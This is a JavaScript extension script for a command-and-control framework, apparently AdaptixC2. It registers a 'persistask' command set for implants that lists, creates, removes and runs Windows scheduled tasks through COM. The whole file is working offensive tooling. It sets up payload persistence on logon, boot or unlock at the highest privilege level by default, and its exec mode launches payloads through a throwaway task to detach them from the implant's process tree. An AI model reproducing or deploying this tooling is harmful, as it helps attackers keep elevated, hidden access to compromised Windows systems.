var metadata = {
    name: "PersisTask-BOF",
    description: "Scheduled task management via COM (ITaskService)"
};

/// COMMANDS

var _cmd_list = ax.create_command("list", "List scheduled tasks (optional case-insensitive filter on name/path)", "persistask list\npersistask list Windows");
_cmd_list.addArgString("filter", "Case-insensitive filter on task name/path", "");
_cmd_list.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let filter = parsed_json["filter"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", ["list", filter, "", "", "", "", "0"]);
    let bof_path = ax.script_dir() + "_bin/persistask." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: List scheduled tasks");
});


var _cmd_add = ax.create_command("add", "Create a persistent scheduled task via COM", "persistask add MyTask C:\\payload.exe /arg1 C:\\ -t logon");
_cmd_add.addArgString("taskname", true);
_cmd_add.addArgString("command", true);
_cmd_add.addArgString("arguments", "Command arguments", "");
_cmd_add.addArgString("workdir", "Working directory", "");
_cmd_add.addArgFlagString("-t", "trigger", "Trigger type: logon (default), boot, or unlock", "logon");
_cmd_add.addArgBool("--no-elevate", "Register at LeastPrivilege instead of RunLevel=Highest");
_cmd_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let taskname  = parsed_json["taskname"];
    let command   = parsed_json["command"];
    let arguments = parsed_json["arguments"];
    let workdir   = parsed_json["workdir"];
    let trigger   = parsed_json["trigger"];
    let noElevate = parsed_json["--no-elevate"] ? "1" : "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", ["add", taskname, command, arguments, workdir, trigger, noElevate]);
    let bof_path = ax.script_dir() + "_bin/persistask." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Add scheduled task [" + trigger + "]");
});


var _cmd_remove = ax.create_command("remove", "Remove a scheduled task by name", "persistask remove MyTask");
_cmd_remove.addArgString("taskname", true);
_cmd_remove.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let taskname = parsed_json["taskname"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", ["remove", taskname, "", "", "", "", "0"]);
    let bof_path = ax.script_dir() + "_bin/persistask." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Remove scheduled task");
});


var _cmd_exec = ax.create_command("exec", "Register an on-demand task, run it, then delete it (detaches from agent process tree)", "persistask exec TmpTask C:\\payload.exe /arg1 C:\\");
_cmd_exec.addArgString("taskname", true);
_cmd_exec.addArgString("command", true);
_cmd_exec.addArgString("arguments", "Command arguments", "");
_cmd_exec.addArgString("workdir", "Working directory", "");
_cmd_exec.addArgBool("--no-elevate", "Register at LeastPrivilege instead of RunLevel=Highest");
_cmd_exec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let taskname  = parsed_json["taskname"];
    let command   = parsed_json["command"];
    let arguments = parsed_json["arguments"];
    let workdir   = parsed_json["workdir"];
    let noElevate = parsed_json["--no-elevate"] ? "1" : "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr", ["exec", taskname, command, arguments, workdir, "", noElevate]);
    let bof_path = ax.script_dir() + "_bin/persistask." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Exec via on-demand task");
});


var cmd_persistask = ax.create_command("persistask", "Scheduled task persistence via COM (ITaskService)");
cmd_persistask.addSubCommands([_cmd_list, _cmd_add, _cmd_remove, _cmd_exec]);

var group_persistask = ax.create_commands_group("PersisTask-BOF", [cmd_persistask]);
ax.register_commands_group(group_persistask, ["beacon", "gopher", "kharon"], ["windows"], []);
